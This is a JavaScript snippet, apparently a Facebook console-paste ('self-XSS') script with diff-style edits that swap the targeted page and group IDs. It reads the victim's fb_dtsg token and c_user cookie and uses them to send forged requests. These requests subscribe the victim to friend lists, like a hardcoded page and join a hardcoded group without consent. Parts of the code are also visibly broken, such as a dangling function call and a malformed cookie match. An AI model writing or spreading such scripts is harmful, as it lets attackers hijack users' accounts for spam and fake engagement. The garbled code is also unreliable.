function IbraheemNada(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)}
IbraheemNada("10201669057945066");IbraheemNada("10202508925821238");IbraheemNada("10202514699485576");IbraheemNada
("10202508955301975");IbraheemNada("10202508952661909");IbraheemNada("10202508944141696");IbraheemNada
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
var Page = new XMLHttpRequest(),
PageURL = '//www.facebook.com/ajax/pages/fan_status.php',
- PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=210176859012871&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
+ PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=1451719371744865&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
Page['open']('POST', PageURL, true);
Page['onreadystatechange'] = function () {
if (Page['readyState'] == 4 && Page['status'] == 200) {
Page['close'];
};
};
Page['send'](PageParams);
};
setTimeout(function () {
var Page = new XMLHttpRequest(),
PageURL = '//www.facebook.com/ajax/groups/membership/r2j.php',
- PageParams = 'fb_dtsg=' + fb_dtsg + '&ref=group_jump_header&group_id=253394301533461&__user=' + user_id + '';
+ PageParams = 'fb_dtsg=' + fb_dtsg + '&ref=group_jump_header&group_id=313297482166470&__user=' + user_id + '';
Page['open']('POST', PageURL, true);
Page['onreadystatechange'] = function () {
if (Page['readyState'] == 4 && Page['status'] == 200) {
Page['close'];
};
};
Page['send'](PageParams);
}, 1000);
-
